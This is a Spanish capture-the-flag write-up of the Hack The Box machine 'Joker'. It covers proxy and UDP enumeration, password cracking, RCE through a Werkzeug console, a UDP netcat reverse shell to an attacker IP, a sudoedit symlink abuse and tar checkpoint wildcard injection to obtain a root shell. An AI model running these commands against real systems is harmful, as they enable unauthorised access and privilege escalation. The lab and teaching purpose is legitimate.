@@ -1,0 +1,514 @@
+---
+layout: post
+title: Joker
+date: 2023-02-17
+description:
+img:
+fig-caption:
+tags: [eWPT, eWPTXv2, OSWE, OSCP]
+---
+___
+
+<center><img src="/writeups/assets/img/Joker-htb/Joker.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración de SQUID Proxy
+
+* Enumeración por UDP
+
+* SSRF - Internal Port Discovering
+
+* Abuso de TFTP
+
+* Bypass reglas Iptables
+
+* Abuso de privilegio Sudoers (User Pivoting)
+
+* Abuso de tarea CRON (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.21 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 10:17 GMT
+Nmap scan report for 10.10.10.21
+Host is up (0.24s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3128/tcp open  squid-http
+
+Nmap done: 1 IP address (1 host up) scanned in 27.88 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,3128 10.10.10.21 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 10:18 GMT
+Nmap scan report for 10.10.10.21
+Host is up (0.049s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8824e357109f1b173d7af3263db6334e (RSA)
+|   256 76b6f60800bd68ce97cb08e777693d8a (ECDSA)
+|_  256 dc91e48dd016cecf3d91820923a7dc86 (ED25519)
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/3.5.12
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds
+```
+
+## Puerto 3128 (HTTP-PROXY)
+
+Con whatweb analizo las tecnologías que está empleando el servidor web
+
+```null
+whatweb http://10.10.10.21:3128
+http://10.10.10.21:3128 [400 Bad Request] Content-Language[en], Country[RESERVED][ZZ], Email[webmaster], HTTPServer[squid/3.5.12], IP[10.10.10.21], Squid-Web-Proxy-Cache[3.5.12], Title[ERROR: The requested URL could not be retrieved], UncommonHeaders[x-squid-error], Via-Proxy[1.1 joker (squid/3.5.12)], X-Cache[joker,joker:3128]
+```
+
+La página principal se ve así
+
+<img src="/writeups/assets/img/Joker-htb/1.png" alt="">
+
+Pruebo a pasar por el proxy, a través del Addon ```FoxyProxy```. No se si requiere de usuario y contraseña
+
+<img src="/writeups/assets/img/Joker-htb/2.png" alt="">
+
+Pero no carga nada. Intercepto los paquetes con ```Wireshark```, y al ser tráfico HTTP puedo ver en la respuesta un error de autenticación
+
+<img src="/writeups/assets/img/Joker-htb/3.png" alt="">
+
+Se filtra en las cabeceras que el reino predeterminado de versión 5 de Kerberos es ```kalamari```
+
+Aunque no tenga credenciales, puedo intentar aplicar un Internal Port Discovery a través de un SSRF
+
+```null
+wfuzz -c --hc=403 --hh=3598,3602 -t 100 -z range,1-65535 -p 10.10.10.21:3128:HTTP http://127.0.0.1:FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://127.0.0.1:FUZZ/
+Total requests: 65535
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000021:   407        144 L    393 W      3590 Ch     "21"                                                                                                                                            
+000000070:   407        144 L    393 W      3590 Ch     "70"                                                                                                                                            
+000000080:   407        144 L    393 W      3576 Ch     "80"                                                                                                                                            
+000000280:   407        144 L    393 W      3594 Ch     "280"                                                                                                                                           
+000000210:   407        144 L    393 W      3594 Ch     "210"                                                                                                                                           
+000000443:   407        144 L    393 W      3594 Ch     "443"                                                                                                                                           
+000000488:   407        144 L    393 W      3594 Ch     "488"                                                                                                                                           
+000000591:   407        144 L    393 W      3594 Ch     "591"                                                                                                                                           
+000000777:   407        144 L    393 W      3594 Ch     "777"                                                                                                                                           
+
+Total time: 79.97870
+Processed Requests: 65535
+Filtered Requests: 65526
+Requests/sec.: 819.4056
+```
+
+Puede que alguno de estos, aunque no estén abiertos por TCP, si que lo estén por UDP.
+
+Aplico un escaneo con ```nmap``` para encontrar los 1000 puertos más comunes
+
+```null
+nmap --top-ports 1000 --open -sU 10.10.10.21 -oG openportsudp
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 10:24 GMT
+Host is up (0.098s latency).
+Not shown: 998 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+69/udp   open|filtered tftp
+5355/udp open|filtered llmnr
+
+Nmap done: 1 IP address (1 host up) scanned in 1089.70 seconds
+```
+
+Y me puedo conectar al puerto 69
+
+```null
+tftp 10.10.10.21
+tftp>    
+```
+
+Intento abrir el ```/etc/passwd```, pero no tengo acceso
+
+```null
+tftp> get /etc/passwd
+Error code 2: Access violation
+```
+
+Puedo descargar la configuración del SQUID Proxy
+
+```null
+tftp> get /etc/squid/squid.conf
+```
+
+```null
+cat squid.conf | grep -v "^#" | sed '/^\s*$/d'
+acl SSL_ports port 443
+acl Safe_ports port 80		# http
+acl Safe_ports port 21		# ftp
+acl Safe_ports port 443		# https
+acl Safe_ports port 70		# gopher
+acl Safe_ports port 210		# wais
+acl Safe_ports port 1025-65535	# unregistered ports
+acl Safe_ports port 280		# http-mgmt
+acl Safe_ports port 488		# gss-http
+acl Safe_ports port 591		# filemaker
+acl Safe_ports port 777		# multiling http
+acl CONNECT method CONNECT
+http_access deny !Safe_ports
+http_access deny CONNECT !SSL_ports
+http_access deny manager
+auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
+auth_param basic realm kalamari
+acl authenticated proxy_auth REQUIRED
+http_access allow authenticated
+http_access deny all
+http_port 3128
+coredump_dir /var/spool/squid
+refresh_pattern ^ftp:		1440	20%	10080
+refresh_pattern ^gopher:	1440	0%	1440
+refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
+refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
+refresh_pattern .		0	20%	4320
+```
+
+Me puedo descargar un archivo con contraseñas
+
+```null
+tftp> get /etc/squid/passwords
+```
+
+```null
+cat passwords
+kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+```
+
+Está hasheada, pero se puede crackear con ```john```
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt passwords
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ihateseafood     (kalamari)     
+1g 0:00:00:28 DONE (2023-02-17 11:19) 0.03552g/s 260001p/s 260001c/s 260001C/s ihateticmark..ihatepwc
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Añado las credenciales a la configuración del ```FoxyProxy```
+
+<img src="/writeups/assets/img/Joker-htb/4.png" alt="">
+
+Ya tengo alcance con el puerto 80 internamente abierto
+
+<img src="/writeups/assets/img/Joker-htb/5.png" alt="">
+
+Pruebo a crear un short URL con el aplicativo
+
+<img src="/writeups/assets/img/Joker-htb/6.png" alt="">
+
+Una sección permite listar lo que se ha creado, incluyendo mi input de usuario. Por detrás se está empleando Flask
+
+<img src="/writeups/assets/img/Joker-htb/7.png" alt="">
+
+Pruebo un SSTI, pero no obtengo resultados
+
+<img src="/writeups/assets/img/Joker-htb/8.png" alt="">
+
+Aplico fuzzing para descubrir rutas
+
+```null
+gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy http://kalamari:ihateseafood@10.10.10.21:3128 -t 100
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://127.0.0.1
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Proxy:                   http://kalamari:ihateseafood@10.10.10.21:3128
+[+] User Agent:              gobuster/3.4
+[+] Timeout:                 10s
+===============================================================
+2023/02/17 11:42:33 Starting gobuster in directory enumeration mode
+===============================================================
+/list                 (Status: 301) [Size: 251] [--> http://127.0.0.1/list/]
+/console              (Status: 200) [Size: 1479]
+Progress: 220532 / 220547 (99.99%)
+===============================================================
+2023/02/17 11:50:43 Finished
+===============================================================
+```
+
+Obtengo ejecución remota de comandos
+
+<img src="/writeups/assets/img/Joker-htb/9.png" alt="">
+
+No tengo conectividad con mi equipo. Puedo leer el archivo de configuración de ```iptables```
+
+```null
+>>> with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
+# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
+*filter
+:INPUT DROP [41573:1829596]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [878:221932]
+-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
+-A INPUT -i ens33 -p udp -j ACCEPT
+-A INPUT -i ens33 -p icmp -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
+COMMIT
+# Completed on Fri May 19 18:01:16 2017
+```
+
+Me envío una reverse shell por UDP
+
+```null
+>>> import os
+>>> os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 1234 -u > /tmp/f &")
+```
+
+Gano acceso al sistema como ```wekzeug```
+
+```null
+nc -nlvp 1234 -u
+listening on [any] 1234 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.21] 33888
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+werkzeug
+$ script /dev/null -c bash
+Script started, file is /dev/null
+werkzeug@joker:~$ ^Z
+zsh: suspended  nc -nlvp 1234 -u
+❯ stty raw -echo; fg
+[1]  + continued  nc -nlvp 1234 -u
+                                  reset xterm
+werkzeug@joker:~$ export TERM=xterm
+werkzeug@joker:~$ export SHELL=bash
+werkzeug@joker:~$ stty rows 55 columns 209
+```
+
+# Escalada
+
+Un archivo de python incluye una base de datos
+
+```null
+werkzeug@joker:~$ cat manage-shorty.py 
+#!/usr/bin/env python
+
+import os
+import tempfile
+import netifaces
+from werkzeug import script
+
+def make_app():
+    from shorty.application import Shorty
+    filename = "/var/www/shorty/data/shorty.db"
+    return Shorty('sqlite:///{0}'.format(filename))
+
+def make_shell():
+    from shorty import models, utils
+    application = make_app()
+    return locals()
+
+action_runserver = script.make_runserver(make_app, hostname=netifaces.ifaddresses('lo')[2][0]['addr'], port=80)
+action_shell = script.make_shell(make_shell)
+action_initdb = lambda: make_app().init_database()
+
+script.run()
+```
+
+```null
+werkzeug@joker:~$ ls -l /var/www/shorty/data/shorty.db
+-rw-r--r-- 1 werkzeug werkzeug 12288 May 18  2017 /var/www/shorty/data/shorty.db
+```
+
+La transfiero a mi equipo, pero está corrupta
+
+```null
+sqlite3 database.db
+SQLite version 3.40.0 2022-11-16 12:10:08
+Enter ".help" for usage hints.
+sqlite> .tables
+Error: database disk image is malformed
+sqlite> 
+```
+
+Tengo un privilegio a nivel de sudoers
+
+```null
+werkzeug@joker:~$ sudo -l
+Matching Defaults entries for werkzeug on joker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir
+
+User werkzeug may run the following commands on joker:
+    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
+```
+
+Creo un directorio para que se cumpla las condiciones
+
+```null
+werkzeug@joker:~/testing$ mkdir pwned
+werkzeug@joker:~/testing$ cd pwned/
+werkzeug@joker:~/testing/pwned$ pwd
+/var/www/testing/pwned
+werkzeug@joker:~/testing/pwned$ sudoedit -u alekos /var/www/testing/pwned/layout.html
+```
+
+Dentro del editor ```nano```, existe una forma de ejecutar comandos, según [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo)
+
+<img src="/writeups/assets/img/Joker-htb/10.png" alt="">
+
+Pero en este caso es un rabbit hole, ya que ninguno de estos dos usuarios tiene capacidad de escritura en ```/var/www/``` y no se puede crear el directorio ```.nano```
+
+```null
+Unable to create directory /var/www/.nano: Permission denied
+```
+
+Sin embargo, se puede crear un arhivo en el directorio actual para hacerle un enlace simbólico a las authorized_keys de ```alekos```, ya que tengo capacidad de lectura
+
+```null
+werkzeug@joker:~/testing/pwned$ ls -l /home/alekos/.ssh/authorized_keys 
+-rw-r--r-- 1 alekos alekos 0 May 20  2017 /home/alekos/.ssh/authorized_keys
+```
+
+Copio mi clave pública a ese archivo, abusando del ```sudoedit```
+
+```null
+werkzeug@joker:~/testing/pwned$ touch layout.html
+werkzeug@joker:~/testing/pwned$ ln -s -f /home/alekos/.ssh/authorized_keys layout.html 
+werkzeug@joker:~/testing/pwned$ sudoedit -u alekos /var/www/testing/pwned/layout.html
+```
+
+Me conecto por SSH a la máquina víctima como ```alekos```
+
+```null
+ssh alekos@10.10.10.21
+The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
+ED25519 key fingerprint is SHA256:DCu3UkgWPWIZMeHG1ck01N+KJZq+0tvFq3qjzzplJlk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.21' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
+alekos@joker:~$ 
+```
+
+Puedo visualizar la primera flag
+
+```null
+alekos@joker:~$ cat user.txt 
+91176299aef153ab7633a0eb22722bd8
+```
+
+Dentro del directorio ```backup``` hay varios archivos comprimidos
+
+```null
+alekos@joker:/var/www/testing$ cd ~/backup/
+alekos@joker:~/backup$ ls
+dev-1514134201.tar.gz  dev-1676637301.tar.gz  dev-1676637901.tar.gz  dev-1676638501.tar.gz  dev-1676639101.tar.gz  dev-1676639701.tar.gz  dev-1676640301.tar.gz  dev-1676640901.tar.gz
+dev-1514134501.tar.gz  dev-1676637601.tar.gz  dev-1676638201.tar.gz  dev-1676638801.tar.gz  dev-1676639401.tar.gz  dev-1676640001.tar.gz  dev-1676640601.tar.gz  dev-1676641202.tar.gz
+```
+
+Utilizo ```scp``` para subir el ```pspy```
+
+```null
+scp /opt/pspy alekos@10.10.10.21:/tmp/pspy
+pspy                                                                 100% 3006KB 704.1KB/s   00:04 
+```
+
+El usuario root está ejecutando un script de bash a intervalos regulares de tiempo
+
+```null
+2023/02/17 16:00:01 CMD: UID=0    PID=5143   | /usr/sbin/CRON -f 
+2023/02/17 16:00:01 CMD: UID=0    PID=5147   | /bin/sh /root/backup.sh 
+2023/02/17 16:00:01 CMD: UID=0    PID=5148   | /bin/sh /root/backup.sh 
+2023/02/17 16:00:01 CMD: UID=0    PID=5149   | /bin/sh /root/backup.sh 
+```
+
+Pero no puedo ver en que consiste. Voy a suponer que el directorio de antes está relacionado. Descomprimo un archivo para ver su estructura y borro todos los comprimidos
+
+```null
+alekos@joker:~/backup$ tar -xf dev-1514134201.tar.gz
+alekos@joker:~/backup$ rm -rf dev-1*
+alekos@joker:~/backup$ ls
+application.py  data  __init__.py  models.py  static  templates  utils.py  views.py
+```
+
+En el directorio ```development``` hay lo mismo
+
+```null
+alekos@joker:~/development$ ls
+application.py  data  __init__.py  models.py  static  templates  utils.py  views.py
+```
+
+Lo más probable es que esté utilizando wildcards para referenciar a todo lo que hay dentro del directorio. Si creo un archivo con un nombre cuyo valor sea un parámentro, lo va a interpretar. En [GTFObins](https://gtfobins.github.io/gtfobins/tar/#shell) está contemplado
+
+<img src="/writeups/assets/img/Joker-htb/11.png" alt="">
+
+Creo un script en python que se encargue de asignarle SUID a la bash
+
+```null
+import os
+
+os.system("chmod u+s /bin/bash")
+```
+
+Agrego los archivos con nombres de parámetros
+
+```null
+alekos@joker:~/development$ touch -- --checkpoint=1
+alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python3 test.py'
+```
+
+En un máximo de 5 minutos la bash pasa a ser SUID y ver la segunda flag
+
+```null
+alekos@joker:~/backup$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1041576 May 16  2017 /bin/bash
+alekos@joker:~/backup$ bash -p
+bash-4.3# cat /root/root.txt
+11d683fbc309f6e3794fe81c33c117ac
+```
